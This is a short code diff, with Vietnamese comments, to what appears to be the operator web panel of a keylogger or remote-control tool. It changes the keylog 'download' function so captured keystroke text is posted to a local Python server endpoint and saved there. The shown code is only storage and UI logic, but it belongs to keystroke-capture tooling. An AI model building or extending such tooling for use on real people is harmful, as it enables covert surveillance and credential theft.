@@ -379,22 +379,31 @@
         }
 
         // --- HÀM DOWNLOAD KEYLOG ---
+        // --- HÀM LƯU KEYLOG VÀO THƯ MỤC LOCAL ---
         function downloadKeylog() {
             // Lấy nội dung text
             const content = document.getElementById('keylog-content').textContent;
             
-            // Tạo tên file theo thời gian
-            const now = new Date();
-            const filename = `keylog_${now.getFullYear()}-${(now.getMonth()+1).toString().padStart(2,'0')}-${now.getDate().toString().padStart(2,'0')}_${now.getHours()}-${now.getMinutes()}.txt`;
-            
-            // Tạo blob và tải về
-            const blob = new Blob([content], { type: "text/plain" });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement("a");
-            a.href = url;
-            a.download = filename;
-            a.click();
-            window.URL.revokeObjectURL(url);
+            // Gửi về server Python (client.py) để lưu
+            fetch('/api/save_keylog_local', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: content })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    showToast("Đã lưu file: " + data.message, "success");
+                } else {
+                    showToast("Lỗi lưu file: " + data.message, "error");
+                }
+            })
+            .catch(err => {
+                showToast("Lỗi kết nối!", "error");
+                console.error(err);
+            });
         }
 
         // --- HÀM XÓA KEYLOG (UI + SERVER) ---
